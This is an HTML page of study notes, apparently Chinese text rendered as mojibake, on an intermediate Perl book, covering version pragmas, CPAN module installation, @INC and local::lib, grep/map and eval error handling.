    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« -ç®€ä»‹"><a href="#ç¬¬ä¸€ç« -ç®€ä»‹" class="headerlink" title="ç¬¬ä¸€ç«  ç®€ä»‹"></a>ç¬¬ä¸€ç«  ç®€ä»‹</h1><p>ç”³è¯· PAUSE è´¦æˆ·, <a href="https://pause.perl.org/pause/authenquery?ACTION=request_id">æ­¤é“¾æ¥</a></p><p>ä½¿ç”¨ <code>use</code> æŒ‡å®šç‰ˆæœ¬æ—¶, å°æ•°ç‚¹ä¹‹åéœ€è¦æœ‰ä¸‰ä¸ªæ•°å­—, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.014</span>;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸¤ä¸ªå°æ•°ç‚¹çš„å½¢å¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">14.2</span>;<br></code></pre></td></tr></table></figure><p>or:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.14</span>.<span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p><a href="http://learn.perl.org/">åœ¨çº¿ Perl ç¤¾åŒº</a></p><h1 id="ç¬¬äºŒç« -ä½¿ç”¨æ¨¡å—"><a href="#ç¬¬äºŒç« -ä½¿ç”¨æ¨¡å—" class="headerlink" title="ç¬¬äºŒç«  ä½¿ç”¨æ¨¡å—"></a>ç¬¬äºŒç«  ä½¿ç”¨æ¨¡å—</h1><p>CPAN (Comprehensice Perl Archive Network). æœ‰ä¸‰ä¸ªç›¸å…³é¡µé¢:</p><ul><li><a href="http://www.cpan.org/">ä¸»é¡µ</a></li><li><a href="http://search.cpan.org/">æœç´¢ç•Œé¢</a></li><li><a href="https://www.metacpan.org/">MetaCPAN</a></li></ul><h2 id="2-1-æ ‡å‡†å‘è¡Œç‰ˆ"><a href="#2-1-æ ‡å‡†å‘è¡Œç‰ˆ" class="headerlink" title="2.1 æ ‡å‡†å‘è¡Œç‰ˆ"></a>2.1 æ ‡å‡†å‘è¡Œç‰ˆ</h2><p>ä½¿ç”¨ <code>Module::CoreList</code> æ¨¡å—å¯ä»¥æŸ¥çœ‹ä¸åŒ Perl ç‰ˆæœ¬ä¸­è‡ªå¸¦çš„æ¨¡å—çš„ä¿¡æ¯.</p><p>Perl å®‰è£…æ—¶è‡ªå¸¦çš„æ¨¡å—è¢«ç§°ä¸º â€œæ ¸å¿ƒæ¨¡å—â€, æˆ– â€œæ ‡å‡†å‘è¡Œç‰ˆâ€.</p><h2 id="2-2-æ¢è®¨-CPAN"><a href="#2-2-æ¢è®¨-CPAN" class="headerlink" title="2.2 æ¢è®¨ CPAN"></a>2.2 æ¢è®¨ CPAN</h2><p>ä»‹ç»äº†å¾ˆå¤šç½‘ç«™, å…·ä½“çœ‹ä¹¦.</p><h2 id="2-3-ä½¿ç”¨æ¨¡å—"><a href="#2-3-ä½¿ç”¨æ¨¡å—" class="headerlink" title="2.3 ä½¿ç”¨æ¨¡å—"></a>2.3 ä½¿ç”¨æ¨¡å—</h2><p>å¯ä»¥è®¿é—®, <a href="http://perldoc.perl.org/">æ­¤ç½‘ç«™</a>, ä»¥ HTML æ ¼å¼æˆ–è€… PDF æ ¼å¼è¯»å– Perl ä¸€äº›ç‰ˆæœ¬çš„æ–‡æ¡£.</p><p>æˆ–è€…ç›´æ¥ç”¨ <code>perldoc</code> å‘½ä»¤ç›´æ¥æŸ¥çœ‹.</p><h2 id="2-4-åŠŸèƒ½æ¥å£"><a href="#2-4-åŠŸèƒ½æ¥å£" class="headerlink" title="2.4 åŠŸèƒ½æ¥å£"></a>2.4 åŠŸèƒ½æ¥å£</h2><h3 id="é€‰æ‹©éœ€è¦å¯¼å…¥çš„å†…å®¹"><a href="#é€‰æ‹©éœ€è¦å¯¼å…¥çš„å†…å®¹" class="headerlink" title="é€‰æ‹©éœ€è¦å¯¼å…¥çš„å†…å®¹"></a>é€‰æ‹©éœ€è¦å¯¼å…¥çš„å†…å®¹</h3><p>åœ¨æ¨¡å—åä¹‹åæŒ‡å®šä¸€ä¸ªå­ä¾‹ç¨‹åˆ—è¡¨, ç§°å¯¼å…¥åˆ—è¡¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Basename (<span class="hljs-string">&#x27;fileparse&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>);<br></code></pre></td></tr></table></figure><p>æ›´å¸¸è§çš„å†™æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Basename qe( fileparse basename );<br></code></pre></td></tr></table></figure><p>å³ä½¿å¯¼å…¥åˆ—è¡¨ä¸­ä»…æœ‰ä¸€é¡¹, æˆ‘ä»¬ä»ç„¶å€¾å‘äºå°†è¯¥é¡¹å†™å…¥ <code>qw()</code> åˆ—è¡¨, ä½¿ç¨‹åºä¸€è‡´æ€§æ›´å¥½å¹¶ä¸”æ˜“äºç»´æŠ¤.</p><p>åœ¨è°ƒç”¨å­ä¾‹ç¨‹æ—¶, æˆ‘ä»¬ä¸éœ€è¦åœ¨å‰é¢æ·»åŠ  â€œ&amp;â€ ç¬¦å·, è¿™æ˜¯å› ä¸ºç¼–è¯‘å™¨å·²ç»é€šè¿‡ <code>use</code> è¯­å¥çŸ¥é“å­ä¾‹ç¨‹çš„åç§°.</p><h2 id="2-5-é¢å‘å¯¹è±¡çš„æ¥å£"><a href="#2-5-é¢å‘å¯¹è±¡çš„æ¥å£" class="headerlink" title="2.5 é¢å‘å¯¹è±¡çš„æ¥å£"></a>2.5 é¢å‘å¯¹è±¡çš„æ¥å£</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Spec;<br><br><span class="hljs-keyword">my</span> $filespec = File::Spec-&gt;catfile( $homedir<span class="hljs-string">&#123;gilligan&#125;</span>, <span class="hljs-string">&#x27;web_docs&#x27;</span>, <span class="hljs-string">&#x27;photos&#x27;</span>, <span class="hljs-string">&#x27;USS_Minnow.gif&#x27;</span> );<br></code></pre></td></tr></table></figure><p>è°ƒç”¨ <code>File::Spec</code> çš„ <code>catfile</code> ç±»æ–¹æ³•. è¯¥æ–¹æ³•ä¸ºæœ¬åœ°æ“ä½œç³»ç»Ÿåˆ›å»ºä¸€ä¸ªåˆé€‚çš„è·¯å¾„, å¹¶ä¸”è¿”å›å•ä¸ªå­—ç¬¦ä¸².</p><h3 id="2-5-1-ä¸€ä¸ªæ›´å…¸å‹çš„é¢å‘å¯¹è±¡æ¨¡å—-Math-BigInt"><a href="#2-5-1-ä¸€ä¸ªæ›´å…¸å‹çš„é¢å‘å¯¹è±¡æ¨¡å—-Math-BigInt" class="headerlink" title="2.5.1 ä¸€ä¸ªæ›´å…¸å‹çš„é¢å‘å¯¹è±¡æ¨¡å—: Math::BigInt"></a>2.5.1 ä¸€ä¸ªæ›´å…¸å‹çš„é¢å‘å¯¹è±¡æ¨¡å—: Math::BigInt</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Math::BigInt;<br><br><span class="hljs-keyword">my</span> $value = Math::BigInt-&gt;new(<span class="hljs-number">2</span>); <span class="hljs-comment"># start with 2</span><br>$value-&gt;bpow(<span class="hljs-number">1000</span>); <span class="hljs-comment"># take 2**1000</span><br><span class="hljs-keyword">print</span> $value-&gt;bstr, <span class="hljs-string">&quot;\n&quot;</span>; <span class="hljs-comment"># print it out</span><br></code></pre></td></tr></table></figure><p><code>new</code> å…³é”®è¯ç”¨æ¥åˆ›å»ºå¯¹è±¡.</p><h3 id="2-5-2-æ›´ä½³çš„æ¨¡å—è¾“å‡º"><a href="#2-5-2-æ›´ä½³çš„æ¨¡å—è¾“å‡º" class="headerlink" title="2.5.2 æ›´ä½³çš„æ¨¡å—è¾“å‡º"></a>2.5.2 æ›´ä½³çš„æ¨¡å—è¾“å‡º</h3><p>ä½¿ç”¨ <code>Spreadsheet::WriteExcel</code> æ¨¡å—.</p><h2 id="2-6-æ ¸å¿ƒæ¨¡å—çš„å†…å®¹"><a href="#2-6-æ ¸å¿ƒæ¨¡å—çš„å†…å®¹" class="headerlink" title="2.6 æ ¸å¿ƒæ¨¡å—çš„å†…å®¹"></a>2.6 æ ¸å¿ƒæ¨¡å—çš„å†…å®¹</h2><p>å…³äº <code>Module::CoreList</code> æ¨¡å—, è§ä¹¦.</p><h2 id="2-7-Perl-ç»¼åˆå…¸è—ç½‘"><a href="#2-7-Perl-ç»¼åˆå…¸è—ç½‘" class="headerlink" title="2.7 Perl ç»¼åˆå…¸è—ç½‘"></a>2.7 Perl ç»¼åˆå…¸è—ç½‘</h2><h2 id="2-8-é€šè¿‡-CPAN-å®‰è£…æ¨¡å—"><a href="#2-8-é€šè¿‡-CPAN-å®‰è£…æ¨¡å—" class="headerlink" title="2.8 é€šè¿‡ CPAN å®‰è£…æ¨¡å—"></a>2.8 é€šè¿‡ CPAN å®‰è£…æ¨¡å—</h2><p>ä½¿ç”¨ Perl è‡ªå¸¦çš„ <code>cpan</code> ç¨‹åº, åªéœ€å‘Šè¯‰ <code>cpan</code> éœ€è¦å®‰è£…çš„æ¨¡å—çš„åç§°.</p><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan Perl::Critic<br></code></pre></td></tr></table></figure><p>è‹¥ä¸å¸¦å‚æ•°, ä¼šå¯åŠ¨ CPAN.pm ä¸­çš„äº¤äº’ shell æ¨¡å¼:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan<br>&gt; install Perl::Tidy<br></code></pre></td></tr></table></figure><p>å¯ä½¿ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perldoc cpan<br></code></pre></td></tr></table></figure><p>æŸ¥é˜….</p><p>å¦ä¸€ä¸ª CPANPLUS æ¨¡å—.</p><h3 id="2-8-1-CPANminux"><a href="#2-8-1-CPANminux" class="headerlink" title="2.8.1 CPANminux"></a>2.8.1 CPANminux</h3><p>cpanm å·¥å…·.</p><h3 id="2-8-2-æ‰‹åŠ¨å®‰è£…æ¨¡å—"><a href="#2-8-2-æ‰‹åŠ¨å®‰è£…æ¨¡å—" class="headerlink" title="2.8.2 æ‰‹åŠ¨å®‰è£…æ¨¡å—"></a>2.8.2 æ‰‹åŠ¨å®‰è£…æ¨¡å—</h3><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wget ...<br>$ tar -xzf ...<br>$ <span class="hljs-built_in">cd</span> ...<br></code></pre></td></tr></table></figure><p>å¦‚æœæ‰¾åˆ°ä¸€ä¸ªåä¸º Makefile.PL çš„æ–‡ä»¶, å°±è¿è¡Œè¿™ä¸€ç³»åˆ—ç¼–è¯‘, æµ‹è¯•å’Œæœ€ç»ˆå®‰è£…æºä»£ç çš„å‘½ä»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl Makefile.PL<br>$ make<br>$ make <span class="hljs-built_in">test</span><br>$ make install<br></code></pre></td></tr></table></figure><p>å¯é€šè¿‡é…ç½® <code>INSTALL_BASE</code> å‚æ•°, å°†è¯¥æ¨¡å—å®‰è£…åˆ°å…¶ä»–è·¯å¾„. å¯é€šè¿‡ <code>perl -V</code> æŸ¥çœ‹é»˜è®¤åº“ç›®å½•ç­‰è®¾å®š.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl Makefile.PL INSTALL_BASE=/User/home/Ginger<br></code></pre></td></tr></table></figure><p>ä¸ºäº†ä½¿ Perl èƒ½å¤Ÿåœ¨ä»¥ä¸Šç›®å½•ä¸­æŸ¥æ‰¾æ‰€å®‰è£…çš„æ¨¡å—, å¯ä»¥è®¾ç½® <code>PERL5LIB</code> ç¯å¢ƒå˜é‡.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">export</span> PERL5LIB=/Users/home/Ginger<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>lib</code> ç¼–è¯‘æŒ‡ä»¤å°†æ¨¡å—çš„å®‰è£…ç›®å½•æ·»åŠ åˆ°æ¨¡å—çš„æœç´¢è·¯å¾„ä¸­.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> lib <span class="hljs-string">qw(/Users/home/Ginger)</span>;<br></code></pre></td></tr></table></figure><p>å¦‚æœåœ¨æ¨¡å—çš„å®‰è£…ç›®å½•ä¸‹æ‰¾åˆ°çš„æ˜¯ Build.PL æ–‡ä»¶è€Œä¸æ˜¯ Makefile.PL:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl Build.PL<br>$ perl Build<br>$ perl Build <span class="hljs-built_in">test</span><br>$ perl Build install<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨çš„æ˜¯ <code>install_base</code> å‚æ•°.</p><h2 id="2-9-é€‚æ—¶è®¾å®šè·¯å¾„"><a href="#2-9-é€‚æ—¶è®¾å®šè·¯å¾„" class="headerlink" title="2.9 é€‚æ—¶è®¾å®šè·¯å¾„"></a>2.9 é€‚æ—¶è®¾å®šè·¯å¾„</h2><p>Perl ä¼šæµè§ˆ <code>@INC</code> (include) æ•°ç»„ä¸­çš„ç›®å½•å…ƒç´ ä»¥æŸ¥æ‰¾æ¨¡å—</p><p>åœ¨ <code>use</code> æ‰§è¡Œå‰ä¿®æ”¹ <code>@INC</code> æ•°ç»„çš„å†…å®¹, æ·»åŠ  <code>BEGIN</code> å—:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">BEGIN &#123; <span class="hljs-keyword">unshift</span> @INC, <span class="hljs-string">&#x27;/Users/gilligan/lib&#x27;</span>; &#125;<br><span class="hljs-keyword">use</span> Navigation::SearOfPants;<br></code></pre></td></tr></table></figure><p>å¯ç”¨ <code>lib</code> ä»£æ›¿:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> lib <span class="hljs-string">&#x27;/Users/gilligan/lib&#x27;</span>;<br><span class="hljs-keyword">use</span> Navigation::SearOfPants;<br></code></pre></td></tr></table></figure><p><code>lib</code> ç¼–è¯‘æŒ‡ä»¤è·å–ä¸€ä¸ªæˆ–è€…å¤šä¸ªå‚æ•°, å¹¶ä¸”å°†å®ƒä»¬æ·»åŠ åˆ° <code>@INC</code> æ•°ç»„çš„èµ·å§‹éƒ¨åˆ†.</p><p><code>use lib</code> åé¢åªæ˜¯æ¨¡å—æ‰€åœ¨çš„ç›®å½•çš„è·¯å¾„, è€Œä¸æ˜¯æ¨¡å—çš„è·¯å¾„.</p><p><code>use lib</code> åœ¨ç¼–è¯‘æ—¶è¿è¡Œ.</p><p>FindBin æ¨¡å—. è¯¥æ¨¡å—æŸ¥æ‰¾è„šæœ¬ç›®å½•çš„å®Œæ•´è·¯å¾„, <code>$BIN</code> å˜é‡æ˜¯å¯¹åº”è„šæœ¬æ‰€åœ¨ç›®å½•çš„è·¯å¾„.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> FindBin <span class="hljs-string">qw( $Bin )</span>;<br></code></pre></td></tr></table></figure><h2 id="2-10-åœ¨ç¨‹åºå¤–éƒ¨è®¾å®šè·¯å¾„"><a href="#2-10-åœ¨ç¨‹åºå¤–éƒ¨è®¾å®šè·¯å¾„" class="headerlink" title="2.10 åœ¨ç¨‹åºå¤–éƒ¨è®¾å®šè·¯å¾„"></a>2.10 åœ¨ç¨‹åºå¤–éƒ¨è®¾å®šè·¯å¾„</h2><h3 id="2-10-1-ä½¿ç”¨-PERL5LIB-æ‰©å±•-INC"><a href="#2-10-1-ä½¿ç”¨-PERL5LIB-æ‰©å±•-INC" class="headerlink" title="2.10.1 ä½¿ç”¨ PERL5LIB æ‰©å±• @INC"></a>2.10.1 ä½¿ç”¨ PERL5LIB æ‰©å±• @INC</h3><p>PERL5LIB å˜é‡èƒ½å¤Ÿåœ¨ç±» UNIX ç³»ç»Ÿä¸­åŒ…å«ç”±å†’å·åˆ†å‰²çš„å¤šä¸ªç›®å½•.</p><h3 id="2-10-2-åœ¨å‘½ä»¤è¡Œæ‰©å±•-INC-ç›®å½•"><a href="#2-10-2-åœ¨å‘½ä»¤è¡Œæ‰©å±•-INC-ç›®å½•" class="headerlink" title="2.10.2 åœ¨å‘½ä»¤è¡Œæ‰©å±• @INC ç›®å½•"></a>2.10.2 åœ¨å‘½ä»¤è¡Œæ‰©å±• @INC ç›®å½•</h3><p>ä½¿ç”¨ä¸€ä¸ªæˆ–å¤šä¸ª <code>-I</code> é€‰é¡¹ç›´æ¥è°ƒç”¨ perl:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -I/home/skipper/perl-lib <br></code></pre></td></tr></table></figure><h2 id="2-11-local-lib"><a href="#2-11-local-lib" class="headerlink" title="2.11 local: lib"></a>2.11 local: lib</h2><p>é»˜è®¤æƒ…å†µä¸‹, CPAN å·¥å…·å°†æ–°æ¨¡å—å®‰è£…åˆ°ä¸ perl ç›¸åŒçš„ç›®å½•.</p><p><code>local::lib</code> æ¨¡å—è®¾å®šå¤šç§ç¯å¢ƒå˜é‡, å…¶å½±å“ CPAN å®¢æˆ·ç«¯å®‰è£…æ¨¡å—çš„ä½ç½®å’Œ Perl ç¨‹åºæŸ¥æ‰¾æ‰€å®‰è£…çš„æ¨¡å—çš„ä½ç½®.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -Mlocal::lib<br></code></pre></td></tr></table></figure><p>å®‰è£… <code>local::lib</code> æ¨¡å—.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl Makefile.PL --bootstrap<br>$ make install<br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨ CPAN å·¥å…·ä¸­ä½¿ç”¨ <code>-I</code> é€‰é¡¹æ¥ä½¿ç”¨ <code>local::lib</code> æ¨¡å—.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan -I Set::Crossproduct<br></code></pre></td></tr></table></figure><p>å…¶ä¼šæŸ¥æ‰¾ä½ æ˜¯å¦æœ‰é»˜è®¤ç›®å½•çš„å†™å…¥æƒé™, å¦‚æœæ²¡æœ‰, åˆ™ä¼šè‡ªåŠ¨å¯ç”¨ <code>local::lib</code> æ¨¡å—.</p><p>è‹¥è¦æ˜ç¡®ä½¿ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan --local-lib HTML::Parser<br></code></pre></td></tr></table></figure><p>åœ¨ç¨‹åºä¸­ä½¿ç”¨ <code>local::lib</code> æ¨¡å—, ç¨‹åºå°±çŸ¥é“åœ¨ä½•å¤„æŸ¥æ‰¾æˆ‘ä»¬å®‰è£…çš„æ¨¡å—.</p><p>è¿˜å¯è¿™æ ·å¤„ç†ä»»ä½•è·¯å¾„:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -Mlocal::lib=<span class="hljs-string">&#x27;~/perlstuff&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="ç¬¬3ç« -ä¸­çº§åŸºç¡€"><a href="#ç¬¬3ç« -ä¸­çº§åŸºç¡€" class="headerlink" title="ç¬¬3ç«  ä¸­çº§åŸºç¡€"></a>ç¬¬3ç«  ä¸­çº§åŸºç¡€</h1><h2 id="3-1-åˆ—è¡¨æ“ä½œç¬¦"><a href="#3-1-åˆ—è¡¨æ“ä½œç¬¦" class="headerlink" title="3.1 åˆ—è¡¨æ“ä½œç¬¦"></a>3.1 åˆ—è¡¨æ“ä½œç¬¦</h2><h3 id="3-1-1-ä½¿ç”¨-grep-è¡¨è¾¾å¼"><a href="#3-1-1-ä½¿ç”¨-grep-è¡¨è¾¾å¼" class="headerlink" title="3.1.1 ä½¿ç”¨ grep è¡¨è¾¾å¼"></a>3.1.1 ä½¿ç”¨ grep è¡¨è¾¾å¼</h3><p>å¯åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @end_in_4 = <span class="hljs-keyword">grep</span> <span class="hljs-regexp">/4$/</span>, @input_numbers;<br></code></pre></td></tr></table></figure><p>å¦‚æœæµ‹è¯•è¿‡äºå¤æ‚, å°±å¯ä»¥å°†å…¶éšè—åœ¨ä¸€ä¸ªå­ä¾‹ç¨‹ä¸­:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @odd_digit_sum = <span class="hljs-keyword">grep</span> digit_sum_is_odd($_), @input_numbers;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">digit_sum_is_odd</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $input = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">my</span> @digits = <span class="hljs-keyword">split</span> <span class="hljs-regexp">//</span>, $input;<br>    <span class="hljs-keyword">my</span> $sum;<br>    $sum += $_ <span class="hljs-keyword">for</span> @ @digits;<br>    <span class="hljs-keyword">return</span> $sum % <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦ä¸€ç§å†™æ³•ä¸º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $test = <span class="hljs-keyword">grep</span> &#123; ... &#125; @list;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ä»£ç å—å®é™…ä¸Šæ˜¯ä¸€ä¸ªåŒ¿åå­ä¾‹ç¨‹.</p><p>èƒ½å¤Ÿå¼•å…¥ä½œç”¨åŸŸé™äº â€œå—â€ çš„å˜é‡, å³ä½¿ç”¨ <code>my</code>.</p><h3 id="3-1-2-ä½¿ç”¨-map-è½¬æ¢åˆ—è¡¨"><a href="#3-1-2-ä½¿ç”¨-map-è½¬æ¢åˆ—è¡¨" class="headerlink" title="3.1.2 ä½¿ç”¨ map è½¬æ¢åˆ—è¡¨"></a>3.1.2 ä½¿ç”¨ map è½¬æ¢åˆ—è¡¨</h3><p>å¯ä»¥æ¯ä¸ªè¾“å…¥äº§ç”Ÿä¸¤ä¸ªè¾“å‡º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @result = <span class="hljs-keyword">map</span> &#123; $_, <span class="hljs-number">3</span> * $_ &#125; @input_numbers;<br></code></pre></td></tr></table></figure><p>å¯ç›´æ¥ä½¿ç”¨ map è¡¨è¾¾å¼ç”Ÿæˆæ•£åˆ—:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %hash = <span class="hljs-keyword">map</span> &#123; $_, <span class="hljs-number">3</span> * $_ &#125; @input_numbers;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä¸ºæ¯ä¸ªè¾“å…¥é¡¹ç”Ÿæˆä¸åŒçš„è¾“å‡ºé¡¹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @result = <span class="hljs-keyword">map</span> &#123; <span class="hljs-keyword">split</span> <span class="hljs-regexp">//</span> &#125; @input_numbers;<br></code></pre></td></tr></table></figure><p><code>split //</code> å°±æ˜¯ç›´æ¥æŠŠè¾“å…¥æ‹†å¼€.</p><p>å¦‚æœä¸€ä¸ªç‰¹å®šè°ƒç”¨çš„ç»“æœæ˜¯ç©ºåˆ—è¡¨, map è¡¨è¾¾å¼å°±å°†è¿™ä¸ªç©ºç»“æœè¿æ¥åˆ°æ›´å¤§çš„åˆ—è¡¨ä¸­, ä¸ä¸ºåˆ—è¡¨æ·»åŠ ä»»ä½•å…ƒç´ :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @result = <span class="hljs-keyword">map</span> &#123;<br>    <span class="hljs-keyword">my</span> @digits = <span class="hljs-keyword">split</span> <span class="hljs-regexp">//</span>, $_;<br>    <span class="hljs-keyword">if</span> ($digits[-<span class="hljs-number">1</span>] == <span class="hljs-number">4</span>) &#123;<br>        @digits;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        (  );   <span class="hljs-comment"># è¿”å›çš„ç©ºåˆ—è¡¨</span><br>    &#125;<br>&#125; @input_numbers;<br></code></pre></td></tr></table></figure><p>èƒ½å¤Ÿç”¨ map è¡¨è¾¾å¼å’Œ grep è¡¨è¾¾å¼åšçš„æ‰€æœ‰äº‹æƒ…, ä¹Ÿèƒ½å¤Ÿä½¿ç”¨æ˜¾ç¤ºçš„ foreach å¾ªç¯å®Œæˆ.</p><h2 id="3-2-ä½¿ç”¨-eval-æ•è·é”™è¯¯"><a href="#3-2-ä½¿ç”¨-eval-æ•è·é”™è¯¯" class="headerlink" title="3.2 ä½¿ç”¨ eval æ•è·é”™è¯¯"></a>3.2 ä½¿ç”¨ eval æ•è·é”™è¯¯</h2><p>eval è¡¨è¾¾å¼æ˜¯ Perl çš„é¦–é€‰å¼‚å¸¸æœºåˆ¶.</p><p>æœ€å¸¸è§çš„æ˜¯åœ¨ eval è¯­å¥å—æ‰§è¡Œå®Œä¹‹åç«‹å³æ£€æŸ¥ <code>$@</code>, è¯¥ç‰¹æ®Šå˜é‡ä¸ºç©ºåˆ™æ„å‘³ç€æ²¡æœ‰é”™è¯¯.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">eval</span> &#123; $average = $total / $count &#125;;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;continuing after error: $@&quot;</span> <span class="hljs-keyword">if</span> $@;<br><br><span class="hljs-keyword">eval</span> &#123; rescue_scheme_42() &#125;;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;continuing after error: $@&quot;</span> <span class="hljs-keyword">if</span> $@;<br></code></pre></td></tr></table></figure><p>eval è¯­å¥å—åçš„åˆ†å·æ˜¯å¿…é¡»çš„, eval æ˜¯ä¸€ä¸ªæœ¯è¯­, è€Œä¸æ˜¯æ§åˆ¶ç»“æ„.</p><p>å—ä¸­çš„ä»£ç è¿è¡Œå¤±è´¥, åœ¨æ ‡é‡ä¸Šä¸‹æ–‡ä¸­è¿”å› undef, åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­è¿”å›ç©ºåˆ—è¡¨. æˆåŠŸåˆ™æœ‰æ­£å¸¸çš„è¿”å›å€¼.</p><p>eval ä¸æ•è·è­¦å‘Š, è¯­æ³•é”™è¯¯, å’Œ perl è‡ªå·±ä¸­æ–­æ‰§è¡Œçš„é”™è¯¯.</p><h2 